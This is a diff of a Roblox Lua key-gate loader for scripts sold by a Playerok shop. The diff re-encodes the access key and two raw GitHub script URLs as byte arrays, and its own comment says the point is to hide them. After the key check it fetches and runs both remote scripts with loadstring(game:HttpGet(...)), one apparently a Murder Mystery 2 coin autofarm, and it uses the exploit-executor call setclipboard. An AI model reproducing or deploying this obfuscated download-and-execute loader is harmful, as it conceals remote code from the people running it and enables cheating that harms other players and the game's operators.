@@ -1,165 +1,124 @@
--- Base64 decode функция
-local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
-local function base64_decode(data)
-    data = string.gsub(data, '[^'..b..'=]', '')
-    return (data:gsub('.', function(x)
-        if (x == '=') then return '' end
-        local r,f='',(b:find(x)-1)
-        for i=6,1,-1 do r=r..(f%2^i - f%2^(i-1) > 0 and '1' or '0') end
-        return r;
-    end):gsub('%d%d%d%d%d%d%d%d', function(x)
-        local c=0
-        for i=1,8 do c=c + (x:sub(i,i) == '1' and 2^(8 - i) or 0) end
-        return string.char(c)
-    end))
+-- Обфусцированный и с "скрытым" ключом и URL
+
+local function fromBytes(t)
+    local s=""
+    for i=1,#t do s=s..string.char(t[i]) end
+    return s
 end
 
--- Закодированный ключ (Playerok MILEDI STORE)
-local encodedKey = "UGxheWVy b2sgTUlM RURJIFNUT1JF"
-encodedKey = encodedKey:gsub("%s+", "")
+local k=fromBytes{80,108,97,121,101,114,111,107,32,77,73,76,69,68,73,32,83,84,79,82,69}
+local u1=fromBytes{104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,102,117,114,113,119,107,47,100,105,112,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,109,111,115,116,46,108,117,97}
+local u2=fromBytes{104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,115,112,97,119,110,101,114,115,99,114,105,112,116,47,77,117,114,100,101,114,77,121,115,116,101,114,121,50,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,102,97,114,109,99,111,105,110,46,108,117,97}
 
-local correctKey = base64_decode(encodedKey)
-
-local player = game.Players.LocalPlayer
-local playerGui = player:WaitForChild("PlayerGui")
+local p=game.Players.LocalPlayer
+local g=p:WaitForChild("PlayerGui")
 
 task.wait(0.1)
 
-local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "PlayerokKeyUI"
-screenGui.ResetOnSpawn = false
-screenGui.Parent = playerGui
+local s=Instance.new("ScreenGui")
+s.Name="PlayerokKeyUI"
+s.ResetOnSpawn=false
+s.Parent=g
 
-local frame = Instance.new("Frame")
-frame.Size = UDim2.new(0, 420, 0, 270)
-frame.Position = UDim2.new(0.5, 0, 0.5, 0)
-frame.AnchorPoint = Vector2.new(0.5, 0.5)
-frame.BackgroundColor3 = Color3.fromRGB(15, 15, 25)
-frame.BorderSizePixel = 0
-frame.Active = true
-frame.Draggable = true
-frame.Parent = screenGui
+local f=Instance.new("Frame")
+f.Size=UDim2.new(0,420,0,270)
+f.Position=UDim2.new(0.5,0,0.5,0)
+f.AnchorPoint=Vector2.new(0.5,0.5)
+f.BackgroundColor3=Color3.fromRGB(15,15,25)
+f.BorderSizePixel=0
+f.Active=true
+f.Draggable=true
+f.Parent=s
 
-local logo = Instance.new("TextLabel", frame)
-logo.Text = "Playerok"
-logo.Size = UDim2.new(1, 0, 0, 60)
-logo.Position = UDim2.new(0, 0, 0, 10)
-logo.Font = Enum.Font.GothamBold
-logo.TextSize = 44
-logo.TextColor3 = Color3.fromRGB(44, 181, 230)
-logo.BackgroundTransparency = 1
+local l=Instance.new("TextLabel",f)
+l.Text="Playerok"
+l.Size=UDim2.new(1,0,0,60)
+l.Position=UDim2.new(0,0,0,10)
+l.Font=Enum.Font.GothamBold
+l.TextSize=44
+l.TextColor3=Color3.fromRGB(44,181,230)
+l.BackgroundTransparency=1
 
-local desc = Instance.new("TextLabel", frame)
-desc.Text = "Введите ключ от MILEDI STORE:"
-desc.Size = UDim2.new(1, -40, 0, 40)
-desc.Position = UDim2.new(0, 20, 0, 70)
-desc.Font = Enum.Font.Gotham
-desc.TextSize = 20
-desc.TextWrapped = true
-desc.TextColor3 = Color3.fromRGB(170, 200, 220)
-desc.BackgroundTransparency = 1
-desc.TextXAlignment = Enum.TextXAlignment.Left
+local d=Instance.new("TextLabel",f)
+d.Text="Введите ключ от MILEDI STORE:"
+d.Size=UDim2.new(1,-40,0,40)
+d.Position=UDim2.new(0,20,0,70)
+d.Font=Enum.Font.Gotham
+d.TextSize=20
+d.TextWrapped=true
+d.TextColor3=Color3.fromRGB(170,200,220)
+d.BackgroundTransparency=1
+d.TextXAlignment=Enum.TextXAlignment.Left
 
-local input = Instance.new("TextBox", frame)
-input.PlaceholderText = "Введите ключ здесь..."
-input.Size = UDim2.new(1, -40, 0, 45)
-input.Position = UDim2.new(0, 20, 0, 120)
-input.Font = Enum.Font.Gotham
-input.TextSize = 20
-input.TextColor3 = Color3.fromRGB(220, 220, 255)
-input.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
-input.BorderSizePixel = 0
-input.ClearTextOnFocus = false
+local i=Instance.new("TextBox",f)
+i.PlaceholderText="Введите ключ здесь..."
+i.Size=UDim2.new(1,-40,0,45)
+i.Position=UDim2.new(0,20,0,120)
+i.Font=Enum.Font.Gotham
+i.TextSize=20
+i.TextColor3=Color3.fromRGB(220,220,255)
+i.BackgroundColor3=Color3.fromRGB(30,30,50)
+i.BorderSizePixel=0
+i.ClearTextOnFocus=false
 
-local confirmButton = Instance.new("TextButton", frame)
-confirmButton.Text = "Подтвердить ключ"
-confirmButton.Size = UDim2.new(1, -40, 0, 45)
-confirmButton.Position = UDim2.new(0, 20, 0, 175)
-confirmButton.Font = Enum.Font.GothamBold
-confirmButton.TextSize = 22
-confirmButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-confirmButton.BackgroundColor3 = Color3.fromRGB(44, 181, 230)
-confirmButton.BorderSizePixel = 0
+local b=Instance.new("TextButton",f)
+b.Text="Подтвердить ключ"
+b.Size=UDim2.new(1,-40,0,45)
+b.Position=UDim2.new(0,20,0,175)
+b.Font=Enum.Font.GothamBold
+b.TextSize=22
+b.TextColor3=Color3.fromRGB(255,255,255)
+b.BackgroundColor3=Color3.fromRGB(44,181,230)
+b.BorderSizePixel=0
 
-local getKeyButton = Instance.new("TextButton", frame)
-getKeyButton.Text = "Получить ключ"
-getKeyButton.Size = UDim2.new(0, 160, 0, 30)
-getKeyButton.Position = UDim2.new(0, 20, 1, -25)
-getKeyButton.Font = Enum.Font.Gotham
-getKeyButton.TextSize = 16
-getKeyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-getKeyButton.BackgroundColor3 = Color3.fromRGB(60, 130, 180)
-getKeyButton.BorderSizePixel = 0
+local gk=Instance.new("TextButton",f)
+gk.Text="Получить ключ"
+gk.Size=UDim2.new(0,160,0,30)
+gk.Position=UDim2.new(0,20,1,-25)
+gk.Font=Enum.Font.Gotham
+gk.TextSize=16
+gk.TextColor3=Color3.fromRGB(255,255,255)
+gk.BackgroundColor3=Color3.fromRGB(60,130,180)
+gk.BorderSizePixel=0
 
-local copiedLabel = Instance.new("TextLabel", frame)
-copiedLabel.Text = ""
-copiedLabel.Size = UDim2.new(0, 200, 0, 30)
-copiedLabel.Position = UDim2.new(0, 190, 1, -35)
-copiedLabel.Font = Enum.Font.Gotham
-copiedLabel.TextSize = 14
-copiedLabel.TextColor3 = Color3.fromRGB(120, 255, 120)
-copiedLabel.BackgroundTransparency = 1
-copiedLabel.TextXAlignment = Enum.TextXAlignment.Left
+local c=Instance.new("TextLabel",f)
+c.Text=""
+c.Size=UDim2.new(0,200,0,30)
+c.Position=UDim2.new(0,190,1,-35)
+c.Font=Enum.Font.Gotham
+c.TextSize=14
+c.TextColor3=Color3.fromRGB(120,255,120)
+c.BackgroundTransparency=1
+c.TextXAlignment=Enum.TextXAlignment.Left
 
-local errorLabel = Instance.new("TextLabel")
-errorLabel.Text = ""
-errorLabel.Size = UDim2.new(0, 400, 0, 60)
-errorLabel.Position = UDim2.new(1, -410, 1, -80)
-errorLabel.Font = Enum.Font.Gotham
-errorLabel.TextSize = 15
-errorLabel.TextColor3 = Color3.fromRGB(255, 85, 85)
-errorLabel.BackgroundTransparency = 1
-errorLabel.TextWrapped = true
-errorLabel.TextXAlignment = Enum.TextXAlignment.Right
-errorLabel.TextYAlignment = Enum.TextYAlignment.Bottom
-errorLabel.Parent = screenGui
+local e=Instance.new("TextLabel")
+e.Text=""
+e.Size=UDim2.new(0,400,0,60)
+e.Position=UDim2.new(1,-410,1,-80)
+e.Font=Enum.Font.Gotham
+e.TextSize=15
+e.TextColor3=Color3.fromRGB(255,85,85)
+e.BackgroundTransparency=1
+e.TextWrapped=true
+e.TextXAlignment=Enum.TextXAlignment.Right
+e.TextYAlignment=Enum.TextYAlignment.Bottom
+e.Parent=s
 
-local function checkKey(text)
-	return text == correctKey
-end
+local function check(t) return t==k end
 
-confirmButton.MouseButton1Click:Connect(function()
-	if checkKey(input.Text) then
-		screenGui:Destroy()
-
-		-- Зашифрованные URL-скрипты
-		local script1_encoded = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Z1cnF3ay9kaXAvcmVmcy9oZWFkcy9tYWluL21vc3QubHVi"
-		local script2_encoded = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NwYXd
-uZXJzY3JpcHQvTXVyZGVyTXlzdGVyeTIvcmVmcy9oZWFkcy9tYWluL2Zhcm1jb2luLmx1Yg=="
-
-		-- Функция декодирования base64 (повторим для локальной видимости)
-		local function decode(data)
-			data = string.gsub(data, '[^'..b..'=]', '')
-			return (data:gsub('.', function(x)
-				if (x == '=') then return '' end
-				local r,f='',(b:find(x)-1)
-				for i=6,1,-1 do r=r..(f%2^i - f%2^(i-1) > 0 and '1' or '0') end
-				return r;
-			end):gsub('%d%d%d%d%d%d%d%d', function(x)
-				local c=0
-				for i=1,8 do c=c + (x:sub(i,i) == '1' and 2^(8 - i) or 0) end
-				return string.char(c)
-			end))
-		end
-
-		local url1 = decode(script1_encoded)
-		local url2 = decode(script2_encoded)
-
-		loadstring(game:HttpGet(url1))()
-		loadstring(game:HttpGet(url2))()
-
+b.MouseButton1Click:Connect(function()
+	if check(i.Text) then
+		s:Destroy()
+		loadstring(game:HttpGet(u1))()
+		loadstring(game:HttpGet(u2))()
 	else
-		errorLabel.Text = "Неверный ключ ❌"
-		task.delay(3, function()
-			errorLabel.Text = ""
-		end)
+		e.Text="Неверный ключ ❌"
+		task.delay(3,function() e.Text="" end)
 	end
 end)
 
-getKeyButton.MouseButton1Click:Connect(function()
+gk.MouseButton1Click:Connect(function()
 	setclipboard("https://playerok.com/profile/MILEDI-STORE/products")
-	copiedLabel.Text = "Ссылка скопирована!"
-	task.delay(3, function()
-		copiedLabel.Text = ""
-	end)
+	c.Text="Ссылка скопирована!"
+	task.delay(3,function() c.Text="" end)
 end)
